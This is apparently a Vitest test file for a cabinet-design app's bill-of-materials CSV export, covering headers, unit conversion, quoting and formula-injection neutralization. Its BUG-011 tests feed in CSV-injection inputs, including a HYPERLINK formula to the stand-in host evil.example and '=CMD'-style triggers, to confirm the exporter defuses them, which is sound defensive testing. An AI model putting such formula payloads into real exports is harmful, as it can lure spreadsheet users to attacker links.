import { describe, expect, it } from 'vitest';
import { computeBOM } from './bom';
import { csvHeaders, toCSV, CSV_BOM } from './csv';
import type { BomRow, CustomPart } from './types';

const row = (overrides: Partial<BomRow> = {}): BomRow => ({
  source: 'sheet',
  label: 'Shelf',
  qty: 1,
  finish: 'Oak',
  w: 800,
  h: 18,
  d: 300,
  thickness: 18,
  sheetAreaM2: 0.24,
  edgeBand: 'Front',
  edgeBandLengthMm: 800,
  grain: 'Along width',
  ...overrides,
});

describe('csvHeaders', () => {
  it('labels dimensions and thickness with the given unit', () => {
    expect(csvHeaders('mm')).toEqual([
      'Type',
      'Part',
      'Qty',
      'Color',
      'W (mm)',
      'H (mm)',
      'D (mm)',
      'Thickness (mm)',
      'Edge Band',
      'Grain',
    ]);
    expect(csvHeaders('cm')[4]).toBe('W (cm)');
    expect(csvHeaders('in')[4]).toBe('W (in)');
  });
});

describe('toCSV', () => {
  it('emits the manufacturing category and explicit panel metadata', () => {
    const lines = toCSV([row()], 'mm').split('\r\n');
    expect(lines[0]).toBe('Type,Part,Qty,Color,W (mm),H (mm),D (mm),Thickness (mm),Edge Band,Grain');
    expect(lines[1]).toBe('Sheet Good,Shelf,1,Oak,800,18,300,18,Front,Along width');
  });

  it('converts dimensions and thickness into the display unit', () => {
    const lines = toCSV([row()], 'cm').split('\r\n');
    expect(lines[1]).toBe('Sheet Good,Shelf,1,Oak,80,1.8,30,1.8,Front,Along width');
  });

  it('converts dimensions into inches', () => {
    const lines = toCSV([row()], 'in').split('\r\n');
    expect(lines[0]).toContain('W (in)');
    expect(lines[1]).toBe('Sheet Good,Shelf,1,Oak,31.5,0.71,11.81,0.71,Front,Along width');
  });

  it('leaves thickness blank for purchased hardware', () => {
    const csv = toCSV([row({ source: 'hardware', label: 'Knob', thickness: null, edgeBand: 'None', grain: '—' })], 'mm');
    expect(csv).toContain('Hardware,Knob,1,Oak,800,18,300,,None,—');
  });

  it('quotes commas, quotes and newlines in user-editable labels', () => {
    expect(toCSV([row({ label: 'Shelf, wide' })], 'mm')).toContain('"Shelf, wide"');
    expect(toCSV([row({ label: 'Panel 24" deep' })], 'mm')).toContain('"Panel 24"" deep"');
    expect(toCSV([row({ label: 'Line one\nLine two' })], 'mm')).toContain('"Line one\nLine two"');
  });

  it('serializes exactly the grouped rows the cut list displays', () => {
    const customParts: CustomPart[] = [
      {
        id: 'custom-1', label: 'Shelf', w: 800, h: 18, d: 300, shape: 'box',
        category: 'panel', thicknessAxis: 'h', grainAxis: 'w', edgeBanding: ['d-max'],
      },
    ];
    const bom = computeBOM({
      customParts,
      overrides: {},
      transforms: {},
      defaultMaterialId: 'ash',
      defaultColorId: 'white',
      defaultHardwareFinishId: 'matte-black',
    });
    expect(toCSV(bom.rows, 'mm').split('\r\n').slice(1)).toHaveLength(bom.rows.length);
  });
});

describe('spreadsheet formula neutralization (BUG-011)', () => {
  /** The Part column of the single data row. Splitting on ',' would break on a
   *  quoted label that contains one, so the row is read after the Type field. */
  const cell = (label: string) => {
    const line = toCSV([row({ label })], 'mm').split('\r\n')[1]!;
    return line.slice('Sheet Good,'.length, line.lastIndexOf(',1,Oak,'));
  };

  it('defuses a label that opens with a formula trigger', () => {
    expect(cell('=HYPERLINK("http://evil.example","Shelf")'))
      .toBe(`"'=HYPERLINK(""http://evil.example"",""Shelf"")"`);
  });

  it('covers every trigger a spreadsheet acts on', () => {
    for (const prefix of ['=', '+', '-', '@']) {
      expect(cell(`${prefix}CMD`)).toBe(`'${prefix}CMD`);
    }
    // A leading tab is stripped before the parser reads the first visible
    // character, so it smuggles a formula through too. Tab is not a CSV
    // delimiter, so the field still needs no quoting.
    expect(cell('\tSUM(A1)')).toBe("'\tSUM(A1)");
  });

  it('leaves an ordinary label untouched', () => {
    expect(cell('Base 600 Shelf')).toBe('Base 600 Shelf');
    expect(cell('Shelf (600mm)')).toBe('Shelf (600mm)');
  });

  it('never prefixes a numeric field, so measurements stay computable', () => {
    const line = toCSV([row({ w: 800, h: 18, d: 300 })], 'mm').split('\r\n')[1]!;
    expect(line.split(',').slice(4, 7)).toEqual(['800', '18', '300']);
  });

  it('exports a UTF-8 BOM so Excel decodes the em dash (BUG-013)', () => {
    expect(CSV_BOM).toBe('﻿');
    // The serializer itself stays pure; CutList prepends the mark.
    expect(toCSV([row()], 'mm').startsWith(CSV_BOM)).toBe(false);
  });
});
